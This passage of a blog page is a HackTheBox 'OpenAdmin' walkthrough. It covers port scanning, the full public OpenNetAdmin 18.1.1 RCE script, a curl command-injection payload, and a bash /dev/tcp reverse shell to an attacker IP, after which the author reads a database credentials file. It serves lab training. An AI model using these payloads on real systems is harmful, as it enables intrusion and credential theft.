@@ -1,0 +1,688 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738Crazy:~&#x2F;HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.171[sudo] crazyinside 的密码：Starting masscan 1.3.2 (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - OpenAdmin">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-OpenAdmin.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738Crazy:~&#x2F;HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.171[sudo] crazyinside 的密码：Starting masscan 1.3.2 (">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/OpenAdmin.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822140815676.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822141232496.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822143822870.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.024Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/OpenAdmin.png">
+  
+  
+  
+  <title>HTB Walkthrough - OpenAdmin - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - OpenAdmin"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          111 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - OpenAdmin</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/OpenAdmin.png" srcset="/img/loading.gif" lazyload alt="OpenAdmin"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.171</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-22 06:01:02 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 10.10.10.171                                    </span><br><span class="line">Discovered open port 80/tcp on 10.10.10.171 </span><br><span class="line">Crazy:~/HackThebox/OpenAdmin$ sudo nmap -sC -sV 10.10.10.171 -oN OpenAdmin -p22,80 </span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 14:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.171</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)</span><br><span class="line">|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)</span><br><span class="line">|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.83 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.171 -oN OpenAdmin -p22,80</span><br><span class="line"></span><br><span class="line">Crazy:~/HackThebox/OpenAdmin$ curl -I 10.10.10.171  </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 22 Aug 2022 06:04:16 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Thu, 21 Nov 2019 14:08:45 GMT</span><br><span class="line">ETag: <span class="string">&quot;2aa6-597dbd5dcea8b&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 10918</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br></pre></td></tr></table></figure>
+
+<p>80端口是Apache默认页面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ dirsearch -u http://10.10.10.171/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/crazyinside/.dirsearch/reports/10.10.10.171/-_22-08-22_14-04-03.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_14-04-03.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.171/</span><br><span class="line"></span><br><span class="line">[14:04:03] Starting: </span><br><span class="line">[14:04:11] 403 -  277B  - /.ht_wsr.txt</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess.save</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess.sample</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess.bak1</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess_extra</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccessOLD</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess.orig</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess_orig</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccess_sc</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccessBAK</span><br><span class="line">[14:04:11] 403 -  277B  - /.htaccessOLD2</span><br><span class="line">[14:04:11] 403 -  277B  - /.htm</span><br><span class="line">[14:04:11] 403 -  277B  - /.httr-oauth</span><br><span class="line">[14:04:11] 403 -  277B  - /.html</span><br><span class="line">[14:04:11] 403 -  277B  - /.htpasswd_test</span><br><span class="line">[14:04:11] 403 -  277B  - /.htpasswds</span><br><span class="line">[14:04:13] 403 -  277B  - /.php</span><br><span class="line">[14:04:59] 200 -   11KB - /index.html</span><br><span class="line">[14:05:07] 301 -  312B  - /music  -&gt;  http://10.10.10.171/music/</span><br><span class="line">[14:05:09] 301 -  310B  - /ona  -&gt;  http://10.10.10.171/ona/</span><br><span class="line">[14:05:18] 403 -  277B  - /server-status</span><br><span class="line">[14:05:18] 403 -  277B  - /server-status/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822140815676.png" srcset="/img/loading.gif" lazyload alt="image-20220822140815676"></p>
+<p>都是一些静态页面，顺着登录可以跳转到<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822141232496.png" srcset="/img/loading.gif" lazyload alt="image-20220822141232496"></p>
+<p>并且顺着帮助索引能够跳转到Github，Github有说默认口令是admin:admin。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ searchsploit opennetadmin           </span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                       |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                                                        | php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                         | php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                                                          | php/webapps/47691.sh</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<p>msf的好像没什么用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   TARGETURI  /ona/login.php   <span class="built_in">yes</span>       Base path</span><br><span class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.171</span><br><span class="line">RHOSTS =&gt; 10.10.10.171</span><br><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; <span class="built_in">set</span> LHOST 10.10.16.3</span><br><span class="line">LHOST =&gt; 10.10.16.3</span><br><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.3:4444 </span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Command Stager progress - 100.00% <span class="keyword">done</span> (702/702 bytes)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.3:4444 </span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Command Stager progress - 100.00% <span class="keyword">done</span> (702/702 bytes)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ <span class="built_in">cat</span> 47691.sh                      </span><br><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">URL=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">&quot;$ &quot;</span>; <span class="built_in">read</span> cmd</span><br><span class="line"> curl --silent -d <span class="string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;<span class="variable">$&#123;cmd&#125;</span>;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="string">&quot;<span class="variable">$&#123;URL&#125;</span>&quot;</span> | sed -n -e <span class="string">&#x27;/BEGIN/,/END/ p&#x27;</span> | <span class="built_in">tail</span> -n +2 | <span class="built_in">head</span> -n -1</span><br><span class="line"><span class="keyword">done</span>                                                                                                                                       </span><br><span class="line">Crazy:~/HackThebox/OpenAdmin$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ curl --silent -d <span class="string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;id;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> http://10.10.10.171/ona/</span><br></pre></td></tr></table></figure>
+
+<p>在页面中会回显执行的结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">&lt;!-- Module Output --&gt;</span><br><span class="line">&lt;table style=<span class="string">&quot;background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;&quot;</span> width=<span class="string">&quot;100%&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span> border=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td align=<span class="string">&quot;left&quot;</span> class=<span class="string">&quot;padding&quot;</span>&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;&quot;</span>&gt;</span><br><span class="line">                &lt;pre style=<span class="string">&quot;padding: 4px;font-family: monospace;&quot;</span>&gt;BEGIN</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">END</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Just a little padding --&gt;</span><br><span class="line">&lt;table style=<span class="string">&quot;background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;&quot;</span> width=<span class="string">&quot;100%&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span> border=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td <span class="built_in">id</span>=<span class="string">&quot;tooltips_extras&quot;</span> align=<span class="string">&quot;center&quot;</span> class=<span class="string">&quot;padding&quot;</span>&gt;&lt;input <span class="built_in">type</span>=<span class="string">&quot;button&quot;</span> class=<span class="string">&quot;edit&quot;</span> name=<span class="string">&quot;Close&quot;</span> value=<span class="string">&quot;Close&quot;</span> onclick=<span class="string">&quot;removeElement(&#x27;tooltips_results&#x27;);&quot;</span>&gt;&lt;br&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;]]&gt;&lt;/cmd&gt;&lt;cmd n=<span class="string">&quot;js&quot;</span>&gt;&lt;![CDATA[toggle_window(<span class="string">&#x27;tooltips_results&#x27;</span>);]]&gt;&lt;/cmd&gt;&lt;/xjx&gt;                                                                                                                                       </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F1337%200%3E%261%27;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot; http://10.10.10.171/ona/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/var/www/html/ona/local/config$ <span class="built_in">ls</span></span><br><span class="line">database_settings.inc.php  motd.txt.example  run_installer</span><br><span class="line">&lt;ml/ona/local/config$ <span class="built_in">cat</span> database_settings.inc.php      </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$ona_contexts</span>=array (</span><br><span class="line">  <span class="string">&#x27;DEFAULT&#x27;</span> =&gt; </span><br><span class="line">  array 